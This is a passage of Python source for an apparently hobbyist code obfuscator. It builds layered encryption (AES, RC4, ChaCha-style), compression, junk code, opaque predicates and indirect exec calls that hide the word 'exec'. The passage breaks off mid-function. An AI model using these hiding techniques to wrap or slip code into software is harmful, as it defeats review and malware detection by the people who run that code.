⢠⠨⣿⣟⢠⣾⣿⠋⠀⠀⡐⠀⠀⠀⠀⠀⠀⠠⠁⠀⠈⠈⠈⠈⠐⢁⠂⠂⠐⠠⣿⡿⠠⠀⠂⠄⠅⠂⠈⠐⠁⠀⠀⠨⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠙⣿⣷⡄⣿⣿⠃⡄⠀
⣾⠀⢻⣗⣿⡟⢁⡆⠀⠀⡂⠀⠀⠀⠀⠀⠀⠠⠁⠀⠀⠀⠀⠀⠀⡂⠀⠀⠀⠀⡀⡂⠀⠀⠀⠀⠨⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠀⠀⠈⠄⠀⢰⡈⠿⣿⢼⡟⢀⡷⠀
⣿⡇⠈⣿⠏⢀⣾⠂⠀⠐⠀⠀⠀⠀⠀⠀⠀⠨⠀⠀⠀⠀⠀⠀⠀⢂⠀⡠⠢⣼⣶⣮⣦⠆⢄⠀⠨⠀⠀⠀⠀⠀⠀⠀⠅⠀⠀⠀⠀⠀⠀⠀⠅⠀⠈⣷⡀⢹⡿⠁⣰⣿⠀
⢺⣿⣆⠘⢠⣿⡟⠀⠀⠨⠀⠂⠄⠂⠐⢀⠢⠨⠀⠂⠔⠀⠢⢐⣐⣴⣿⡇⠀⠀⣾⣧⠀⠀⢸⣿⣮⣠⠠⠐⠠⠐⠀⠂⠅⠐⠠⠐⠠⠐⠠⠐⡐⠀⠀⢿⣿⡄⠋⣰⣿⡗⠀
⠘⣿⣿⡂⣿⣿⠃⡀⠀⠨⠀⠀⠀⠀⠀⠀⠀⢐⢠⣶⣶⣿⣿⣿⣿⣿⣿⠀⠀⠈⣸⡇⠁⠀⢈⣿⣿⣿⣿⣿⣷⣾⣶⡄⠡⠀⠀⠀⠀⠀⠀⠀⠄⠀⢀⠘⣿⣿⢠⣿⣿⠃⠀
⣅⠘⢿⣧⣿⡏⢐⡧⠀⠀⠅⠀⠀⠀⠀⠀⠀⢀⣺⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⣾⣿⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡧⠂⠀⠀⠀⠀⠀⠀⠠⠁⠀⣼⡂⢹⣿⢼⡿⠃⣰⠀
⢻⣧⠈⠻⣾⠁⣸⣿⠀⠀⠡⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠈⣿⣿⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠌⠀⠀⣿⡇⢈⣿⠟⢁⣴⡟⠀
⠈⢿⣿⣆⡘⠅⣻⣿⡂⠀⠈⠄⠀⡀⠠⢀⠂⢪⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢈⣿⣿⠄⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⠂⠄⠄⡀⢀⠠⠁⢀⠨⣿⣿⠀⢃⣴⣿⡟⠁⠀
⠀⠈⠻⣿⣷⣄⢻⣿⡂⢹⣄⠈⡐⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⡐⠀⣠⡇⢨⣿⡗⣠⣿⣿⠟⠀⠀⠀
⠀⠀⢢⠘⠻⢿⣯⢿⡇⠨⣿⣄⠀⢂⠀⠀⠀⢽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⡐⠀⣨⣿⠅⣸⡿⣽⡿⠟⢁⡔⠀⠀⠀
⠀⠀⠀⢿⣦⣀⠙⠻⢿⡀⣿⣿⡆⠀⠂⠄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠌⠀⢰⣿⣿⠠⡿⠟⠉⣀⣴⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣷⣶⣤⣁⠘⣿⣷⡘⢦⣈⢐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢡⡴⢃⣿⡿⠃⣈⣤⣶⣿⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣷⣮⡿⣧⡘⢿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⠃⣼⣿⣵⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⢤⣈⠉⠋⠛⠻⠳⠌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠡⠞⠟⠋⠋⠉⣁⣤⠊⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣷⣷⣷⣾⣶⣮⣯⣿⡿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣽⣶⣶⣷⣾⣾⣾⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡉⠙⠙⠙⠉⠉⣀⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠉⠉⠙⠙⢉⢉⡡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⡿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⡿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠅⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⠉⠙⠙⠛⠛⠛⠛⠙⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
   os.system(f'echo "{ascii_obf}" | lolcat 2>/dev/null || echo "{ascii_obf}"')

   print(f"""
{W}╭─────────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Obfuscate{R} │ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────────╯{N}""")

   def load_bar(stop_event, text="Processing"):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] {text} [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.08)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()

   class AdvancedObfuscator:
    
    def __init__(self):
        self.entropy_seed = random.randint(100000, 999999)
        random.seed(self.entropy_seed)
        self.layer_count = random.randint(8, 12)
        
    _HIRAGANA = list('あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをんがぎぐげござじずぜぞだぢづでどばびぶべぼぱぴぷぺぽ')
    _KATAKANA = list('アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンガギグゲゴザジズゼゾダヂヅデドバビブベボパピプペポ')
    _KANJI    = list('変数関数定数処理実行暗号化復号解析防止保護乱数秘密鍵署名検証制御構造初期値終了判定変換展開圧縮整数文字列配列辞書集合型演算比較条件分岐繰返反復')

    def _quantum_name(self, length=None):
        if length is None:
            length = random.randint(8, 18)

        style = random.choice(['hiragana', 'katakana', 'kanji', 'mixed'])

        if style == 'hiragana':
            pool = self._HIRAGANA
        elif style == 'katakana':
            pool = self._KATAKANA
        elif style == 'kanji':
            pool = self._KANJI
        else:
            pool = self._HIRAGANA + self._KATAKANA + self._KANJI

        parts = [random.choice(pool) for _ in range(length)]
        prefix = '_'
        suffix = random.choice(['_', ''])

        return f"{prefix}{''.join(parts)}{suffix}"

    def _shadow_name(self, length=None):
        if length is None:
            length = random.randint(12, 22)
        pool = self._KATAKANA
        chars = [random.choice(pool) for _ in range(length)]
        return '_' + ''.join(chars) + '_'

    def _aes_encrypt(self, data, key):
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            cipher = AES.new(key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))
            return cipher.iv + ct_bytes
        except ImportError:
            block_size = 16
            padding = block_size - len(data) % block_size
            data = data + bytes([padding] * padding)
            
            key_schedule = self._aes_key_schedule(key)
            
            iv = os.urandom(16)
            encrypted = bytearray(iv)
            
            prev_block = iv
            for i in range(0, len(data), 16):
                block = data[i:i+16]
                xored = bytes(a ^ b for a, b in zip(block, prev_block))
                encrypted_block = self._aes_encrypt_block(xored, key_schedule)
                encrypted.extend(encrypted_block)
                prev_block = encrypted_block
            
            return bytes(encrypted)
    
    def _aes_key_schedule(self, key):
        w = []
        for i in range(4):
            w.append(int.from_bytes(key[4*i:4*i+4], 'big'))
        
        for i in range(4, 44):
            temp = w[i-1]
            if i % 4 == 0:
                temp = self._sub_word(self._rot_word(temp)) ^ self._rcon(i // 4)
            w.append(w[i-4] ^ temp)
        
        return w
    
    def _aes_encrypt_block(self, block, key_schedule):
        state = [list(block[i:i+4]) for i in range(0, 16, 4)]
        state = [[state[j][i] for j in range(4)] for i in range(4)]
        
        self._add_round_key(state, key_schedule, 0)
        
        for round in range(1, 10):
            self._sub_bytes(state)
            self._shift_rows(state)
            self._mix_columns(state)
            self._add_round_key(state, key_schedule, round)
        
        self._sub_bytes(state)
        self._shift_rows(state)
        self._add_round_key(state, key_schedule, 10)
        
        output = []
        for i in range(4):
            for j in range(4):
                output.append(state[i][j])
        
        return bytes(output)
    
    def _sub_word(self, word):
        return (self._sbox[(word >> 24) & 0xff] << 24) | \
               (self._sbox[(word >> 16) & 0xff] << 16) | \
               (self._sbox[(word >> 8) & 0xff] << 8) | \
               self._sbox[word & 0xff]
    
    def _rot_word(self, word):
        return ((word << 8) | (word >> 24)) & 0xffffffff
    
    def _rcon(self, i):
        rcon_lookup = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]
        return rcon_lookup[i-1] << 24
    
    def _add_round_key(self, state, key_schedule, round):
        for i in range(4):
            for j in range(4):
                k = key_schedule[round * 4 + j]
                state[i][j] ^= (k >> (24 - 8 * i)) & 0xff
    
    def _sub_bytes(self, state):
        for i in range(4):
            for j in range(4):
                state[i][j] = self._sbox[state[i][j]]
    
    def _shift_rows(self, state):
        state[1] = state[1][1:] + state[1][:1]
        state[2] = state[2][2:] + state[2][:2]
        state[3] = state[3][3:] + state[3][:3]
    
    def _mix_columns(self, state):
        for i in range(4):
            s0, s1, s2, s3 = state[0][i], state[1][i], state[2][i], state[3][i]
            state[0][i] = self._gf_mul(s0, 2) ^ self._gf_mul(s1, 3) ^ s2 ^ s3
            state[1][i] = s0 ^ self._gf_mul(s1, 2) ^ self._gf_mul(s2, 3) ^ s3
            state[2][i] = s0 ^ s1 ^ self._gf_mul(s2, 2) ^ self._gf_mul(s3, 3)
            state[3][i] = self._gf_mul(s0, 3) ^ s1 ^ s2 ^ self._gf_mul(s3, 2)
    
    def _gf_mul(self, a, b):
        p = 0
        for _ in range(8):
            if b & 1:
                p ^= a
            hi_bit_set = a & 0x80
            a = (a << 1) & 0xFF
            if hi_bit_set:
                a ^= 0x1b
            b >>= 1
        return p
    
    @property
    def _sbox(self):
        return [
            0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
            0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
            0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
            0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
            0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
            0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
            0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
            0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
            0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
            0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
            0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
            0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
            0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
            0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
            0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
            0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
        ]

    def _double_compress(self, data):
        first = zlib.compress(data, 9)
        second = zlib.compress(first, 9)
        return second

    def _double_decompress_code(self, v_data, v_zlib):
        v1 = self._quantum_name(8)
        lines = [
            f"{v1}={v_zlib}.decompress({v_data})",
            f"{v_data}={v_zlib}.decompress({v1})",
        ]
        return lines, v_data

    def _split_payload_hex(self, hex_str):
        chunk_size = random.randint(40, 80) * 2
        chunks = [hex_str[i:i+chunk_size] for i in range(0, len(hex_str), chunk_size)]
        return chunks

    def _build_chunk_join_code(self, chunks):
        var_names = [self._shadow_name() for _ in chunks]
        lines = []
        for vn, ch in zip(var_names, chunks):
            lines.append(f"{vn}='{ch}'")
        joined_var = self._shadow_name()
        lines.append(f"{joined_var}=" + "+".join(var_names))
        lines.append(f"{joined_var}=bytes.fromhex({joined_var})")
        return lines, joined_var

    def _mutate_bytecode(self, bytecode):
        mutation_key = os.urandom(4)
        key_int = int.from_bytes(mutation_key, 'big')
        mutated = bytearray()
        for i, b in enumerate(bytecode):
            k = (key_int >> (8 * (i % 4))) & 0xFF
            mutated.append(b ^ k ^ (i % 256))
        return bytes(mutated), mutation_key

    def _demutate_code(self, v_data, mutation_key_hex):
        v_key = self._quantum_name(8)
        v_ki  = self._quantum_name(8)
        v_out = self._quantum_name(8)
        lines = [
            f"{v_key}=bytes.fromhex('{mutation_key_hex}')",
            f"{v_ki}=int.from_bytes({v_key},'big')",
            f"{v_out}=bytes([b^(({v_ki}>>(8*(i%4)))&0xFF)^(i%256) for i,b in enumerate({v_data})])",
        ]
        return lines, v_out

    def _self_integrity_check(self, payload_hex, v_hashlib):
        expected_hash = hashlib.sha256(payload_hex.encode()).hexdigest()
        vp = self._shadow_name()
        vh = self._shadow_name()
        lines = [
            f"{vp}='{payload_hex}'",
            f"{vh}=__import__('hashlib').sha256({vp}.encode()).hexdigest()",
            f"if {vh}!='{expected_hash}':raise SystemExit(chr(80)+chr(97)+chr(121)+chr(108)+chr(111)+chr(97)+chr(100)+chr(32)+chr(105)+chr(110)+chr(116)+chr(101)+chr(103)+chr(114)+chr(105)+chr(116)+chr(121)+chr(32)+chr(99)+chr(104)+chr(101)+chr(99)+chr(107)+chr(32)+chr(102)+chr(97)+chr(105)+chr(108)+chr(101)+chr(100))",
        ]
        return lines, vp

    def _create_fake_vm(self):
        vm_name = self._quantum_name(10)
        op_var  = self._quantum_name(8)
        stk_var = self._quantum_name(8)
        lines = [
            f"class {vm_name}:",
            f"    def __init__(self):",
            f"        self.{stk_var}=[]",
            f"        self.{op_var}={{",
            f"            0x01:lambda x:self.{stk_var}.append(x),",
            f"            0x02:lambda x:self.{stk_var}.pop()if self.{stk_var} else None,",
            f"            0x03:lambda x:self.{stk_var}.__class__.__name__,",
            f"            0x04:lambda x:sum(self.{stk_var})if self.{stk_var} else 0,",
            f"            0x05:lambda x:len(self.{stk_var}),",
            f"        }}",
            f"    def run(self,code):",
            f"        for op,arg in code:",
            f"            if op in self.{op_var}:",
            f"                self.{op_var}[op](arg)",
        ]
        return lines

    def _build_staged_exec_call(self, exec_fn_expr: str, code_var: str, globals_expr: str = 'globals()') -> list:
        lines = []
        v_parts = [self._shadow_name() for _ in range(4)]
        v_joined = self._shadow_name()
        v_fn = self._shadow_name()
        b = self._obf_str_to_chrexpr('builtins')
        e_parts = [self._obf_str_to_chrexpr(c) for c in ['ex', 'ec']]
        lines.append(f"{v_parts[0]}={e_parts[0]}")
        lines.append(f"{v_parts[1]}={e_parts[1]}")
        lines.append(f"{v_joined}={v_parts[0]}+{v_parts[1]}")
        lines.append(f"{v_fn}=__import__({b}).__dict__[{v_joined}]")
        lines.append(f"{v_fn}({code_var},{globals_expr})")
        return lines

    def _create_multilayer_noise(self):
        lines = []
        for _ in range(random.randint(12, 20)):
            vn = self._quantum_name()
            style = random.randint(0, 7)
            if style == 0:
                depth = random.randint(2, 4)
                expr = f"{random.randint(1,9999)}"
                for _ in range(depth):
                    op = random.choice(['+','^','|','&'])
                    expr = f"({expr}{op}{random.randint(0,255)})"
                lines.append(f"{vn}={expr}")
            elif style == 1:
                n = random.randint(3, 8)
                lines.append(f"{vn}=(lambda {''.join(f'_{i},' for i in range(n))}:None)({','.join(str(random.randint(0,255)) for _ in range(n))})")
            elif style == 2:
                lines.append(f"{vn}={{**{{chr({random.randint(65,90)}):bytes([{random.randint(0,255)}])}},**{{chr({random.randint(97,122)}):None}}}}")
            elif style == 3:
                lines.append(f"{vn}=[x^{random.randint(1,255)} for x in range({random.randint(16,64)})]")
            elif style == 4:
                seed_v = random.randint(1000,9999)
                fake_cls = f"_C{random.randint(100,999)}_"
                lines.append(f"{vn}=type('{fake_cls}',(object,),{{'_s':bytes([{random.randint(0,255)},{random.randint(0,255)}]),'_v':{seed_v}}})()")
            elif style == 5:
                lines.append(f"{vn}=(lambda f:f(f))(lambda x:x if {random.randint(0,9)}>{random.randint(10,19)} else x)")
            elif style == 6:
                lines.append(f"{vn}=memoryview(bytes([{','.join(str(random.randint(0,255)) for _ in range(random.randint(4,16)))}]))")
            else:
                inner = self._obf_str_to_chrexpr(str(random.randint(100000,999999)))
                lines.append(f"{vn}=int({inner})")
        return lines

    def _rc4(self, key: bytes, data: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        i = j = 0
        result = []
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result.append(byte ^ S[(S[i] + S[j]) % 256])
        return bytes(result)

    def _rc4_runtime_code(self, v_data, rc4_key_hex):
        vS = self._quantum_name(6)
        vj = self._quantum_name(5)
        vi = self._quantum_name(5)
        vk = self._quantum_name(6)
        vr = self._quantum_name(6)
        vout = self._quantum_name(6)
        lines = [
            f"{vk}=bytes.fromhex('{rc4_key_hex}')",
            f"{vS}=list(range(256))",
            f"{vj}=0",
            f"for {vi} in range(256):",
            f"    {vj}=({vj}+{vS}[{vi}]+{vk}[{vi}%len({vk})])%256",
            f"    {vS}[{vi}],{vS}[{vj}]={vS}[{vj}],{vS}[{vi}]",
            f"{vi}={vj}=0",
            f"{vr}=[]",
            f"for {vout} in {v_data}:",
            f"    {vi}=({vi}+1)%256",
            f"    {vj}=({vj}+{vS}[{vi}])%256",
            f"    {vS}[{vi}],{vS}[{vj}]={vS}[{vj}],{vS}[{vi}]",
            f"    {vr}.append({vout}^{vS}[({vS}[{vi}]+{vS}[{vj}])%256])",
            f"{v_data}=bytes({vr})",
        ]
        return lines, v_data

    def _interleave(self, data: bytes, n: int) -> list:
        return [data[i::n] for i in range(n)]

    def _deinterleave_runtime(self, streams: list, n: int, total_len: int):
        stream_vars = [self._shadow_name() for _ in streams]
        vn      = self._quantum_name(5)
        vtotal  = self._quantum_name(5)
        vresult = self._quantum_name(6)
        vi      = self._quantum_name(4)
        vj      = self._quantum_name(4)
        vb      = self._quantum_name(4)
        vs      = self._quantum_name(4)
        lines = []
        for sv, stream in zip(stream_vars, streams):
            lines.append(f"{sv}=bytes.fromhex('{stream.hex()}')")
        lines += [
            f"{vn}={n}",
            f"{vtotal}={total_len}",
            f"{vresult}=bytearray({vtotal})",
            f"for {vi},{vs} in enumerate([{','.join(stream_vars)}]):",
            f"    for {vj},{vb} in enumerate({vs}):",
            f"        {vresult}[{vi}+{vj}*{vn}]={vb}",
            f"{vresult}=bytes({vresult})",
        ]
        return lines, vresult

    def _positional_caesar(self, data: bytes, seed: int) -> bytes:
        rng = random.Random(seed)
        offsets = [rng.randint(1, 254) for _ in range(len(data))]
        return bytes([(b + offsets[i]) % 256 for i, b in enumerate(data)])

    def _rev_positional_caesar_runtime(self, v_data, seed):
        vrng  = self._quantum_name(5)
        voffs = self._quantum_name(6)
        vout  = self._quantum_name(6)
        lines = [
            f"{vrng}=__import__('random').Random({seed})",
            f"{voffs}=[{vrng}.randint(1,254) for _ in range(len({v_data}))]",
            f"{vout}=bytes([(b-{voffs}[i])%256 for i,b in enumerate({v_data})])",
            f"{v_data}={vout}",
        ]
        return lines, v_data

    def _opaque_predicates(self, count=8):
        preds = []
        for _ in range(count):
            n = random.randint(2, 99)
            style = random.randint(0, 5)
            vt = self._shadow_name()
            if style == 0:
                preds.append(f"{vt}={n}*({n}+1)")
                preds.append(f"if {vt}%2!=0:raise SystemExit('0x{random.randint(0,0xFFFF):04X}')")
            elif style == 1:
                preds.append(f"{vt}={n}^{n}")
                preds.append(f"if {vt}!=0:raise SystemExit('0x{random.randint(0,0xFFFF):04X}')")
            elif style == 2:
                preds.append(f"{vt}=abs({random.randint(-9999,9999)})")
                preds.append(f"if {vt}<0:raise SystemExit('0x{random.randint(0,0xFFFF):04X}')")
            elif style == 3:
                preds.append(f"{vt}={n}//1")
                preds.append(f"if {vt}!={n}:raise SystemExit('0x{random.randint(0,0xFFFF):04X}')")
            elif style == 4:
                preds.append(f"{vt}=len(range({n}))")
                preds.append(f"if {vt}!={n}:raise SystemExit('0x{random.randint(0,0xFFFF):04X}')")
            else:
                preds.append(f"{vt}=str(int(str({n})))")
                preds.append(f"if {vt}!='{n}':raise SystemExit('0x{random.randint(0,0xFFFF):04X}')")
        return preds

    def _obf_int(self, n: int) -> str:
        """Representasi integer sebagai ekspresi aritmetika."""
        if n == 0:
            z = random.randint(1, 255)
            return f"({z}^{z})"
        style = random.randint(0, 4)
        if style == 0:
            a = random.randint(1, max(1, n-1))
            return f"({a}+{n-a})"
        elif style == 1:
            return f"(0x{n:02X})"
        elif style == 2:
            m = n * random.randint(2, 5)
            return f"({m}//{m//n})"
        elif style == 3:
            xv = random.randint(1, 255)
            return f"({n ^ xv}^{xv})"
        else:
            return f"(int('{n}'))"

    def _obf_str_to_chrexpr(self, s: str) -> str:
        return '+'.join(f'chr({self._obf_int(ord(c))})' for c in s)

    def _indirect_exec(self, code_expr: str, globals_expr: str = 'globals()') -> str:
        style = random.randint(0, 3)
        b = self._obf_str_to_chrexpr('builtins')
        e = self._obf_str_to_chrexpr('exec')
        ev = self._obf_str_to_chrexpr('eval')
        if style == 0:
            return f"__import__({b}).__dict__[{e}]({code_expr},{globals_expr})"
        elif style == 1:
            vb = self._shadow_name()
            return f"(lambda {vb}:{vb}.__dict__[{e}]({code_expr},{globals_expr}))(__import__({b}))"
        elif style == 2:
            return f"getattr(__import__({b}),{e})({code_expr},{globals_expr})"
        else:
            return f"(lambda _g,_c:__import__({b}).__dict__[{e}](_c,_g))({globals_expr},{code_expr})"

    def _chacha_stream(self, key: bytes, nonce: bytes, length: int) -> bytes:
        """Simplified ChaCha20-style keystream generator."""
        def _rotl(v, n): return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF
        def _qr(a, b, c, d):
            a=(a+b)&0xFFFFFFFF; d=_rotl(d^a,16)
            c=(c+d)&0xFFFFFFFF; b=_rotl(b^c,12)
            a=(a+b)&0xFFFFFFFF; d=_rotl(d^a,8)
            c=(c+d)&0xFFFFFFFF; b=_rotl(b^c,7)
            return a,b,c,d
        key_words   = [int.from_bytes(key[i:i+4], 'little') for i in range(0,32,4)]
        nonce_words = [int.from_bytes(nonce[i:i+4], 'little') for i in range(0,12,4)]
        stream = b''
        counter = 0
        while len(stream) < length:
            state = [
                0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
                *key_words,
                counter,
                *nonce_words,
            ]
            working = state[:]
            for _ in range(10):
                working[0],working[4],working[8],working[12]  = _qr(*[working[i] for i in [0,4,8,12]])
                working[1],working[5],working[9],working[13]  = _qr(*[working[i] for i in [1,5,9,13]])
                working[2],working[6],working[10],working[14] = _qr(*[working[i] for i in [2,6,10,14]])
                working[3],working[7],working[11],working[15] = _qr(*[working[i] for i in [3,7,11,15]])
                working[0],working[5],working[10],working[15] = _qr(*[working[i] for i in [0,5,10,15]])
                working[1],working[6],working[11],working[12] = _qr(*[working[i] for i in [1,6,11,12]])
                working[2],working[7],working[8],working[13]  = _qr(*[working[i] for i in [2,7,8,13]])
                working[3],working[4],working[9],working[14]  = _qr(*[working[i] for i in [3,4,9,14]])
            output = [(working[i]+state[i])&0xFFFFFFFF for i in range(16)]
            for w in output:
                stream += w.to_bytes(4, 'little')
            counter += 1
        return stream[:length]

    def _chacha_encrypt(self, data: bytes, key: bytes, nonce: bytes) -> bytes:
        ks = self._chacha_stream(key, nonce, len(data))
        return bytes(a ^ b for a, b in zip(data, ks))

    def _chacha_runtime_code(self, v_data, key_hex, nonce_hex):
        """Generate obfuscated runtime ChaCha20 decryption code."""
        v = [self._quantum_name(6) for _ in range(20)]
        lines = [
            f"def {v[0]}(v,n):",
            f"    def {v[1]}(x,s):return((x<<s)|(x>>(32-s)))&0xFFFFFFFF",
            f"    def {v[2]}(a,b,c,d):",
            f"        a=(a+b)&0xFFFFFFFF;d={v[1]}(d^a,16)",
            f"        c=(c+d)&0xFFFFFFFF;b={v[1]}(b^c,12)",
            f"        a=(a+b)&0xFFFFFFFF;d={v[1]}(d^a,8)",
            f"        c=(c+d)&0xFFFFFFFF;b={v[1]}(b^c,7)",
            f"        return a,b,c,d",
            f"    {v[3]}=[int.from_bytes(v[i:i+4],'little')for i in range(0,32,4)]",
            f"    {v[4]}=[int.from_bytes(n[i:i+4],'little')for i in range(0,12,4)]",
            f"    {v[5]}=b'';{v[6]}=0",
            f"    while len({v[5]})<len({v_data}):",
            f"        {v[7]}=[0x61707865,0x3320646e,0x79622d32,0x6b206574,*{v[3]},{v[6]},*{v[4]}]",
            f"        {v[8]}={v[7]}[:]",
            f"        for _ in range(10):",
